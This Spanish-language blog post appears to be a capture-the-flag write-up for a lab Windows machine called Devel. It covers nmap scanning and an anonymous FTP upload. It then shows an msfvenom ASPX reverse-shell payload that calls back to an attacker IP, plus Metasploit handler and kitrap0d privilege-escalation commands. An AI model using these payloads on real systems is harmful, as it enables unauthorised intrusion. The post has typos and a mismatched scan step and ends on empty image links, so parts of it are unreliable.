---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Devel              |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 |  0                 |
| IP                     | 10.10.10.5         |

## [](#header-2)Introduccion

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Devel/scan1.png)

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.5
```

![nmap 1](/assets/images/Devel/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts
```

![nmap 2](/assets/images/Devel/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80 10.10.10.5 -oN targeted
```

![nmap 3](/assets/images/Devel/nmap3.png)

Este escaneo nos muestra que el servicio de ftp tiene el usuario anonymous habilitado, y dentro unos archivos y una carpeta que parece estar vacia.

Ahora parece que podemos meter una webshell, como lo hicimos con la maquina Worker, pero esta vez con metasploit de la manera siguiente:

```s
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=443 -f aspx > meta2.aspx
```

Ahora con msfconsole

```s
use exploit/multi/andler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.29
set LPORT 443
```

Una vez con la sesion abierta de meterpreter, buscaremos vulnerabilidades de la siguiente forma:

```s
search suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST 10.10.14.29
set LPORT 443
```

![nmap 3](/assets/images/Devel/nmap3.png)

![nmap 3](/assets/images/Devel/)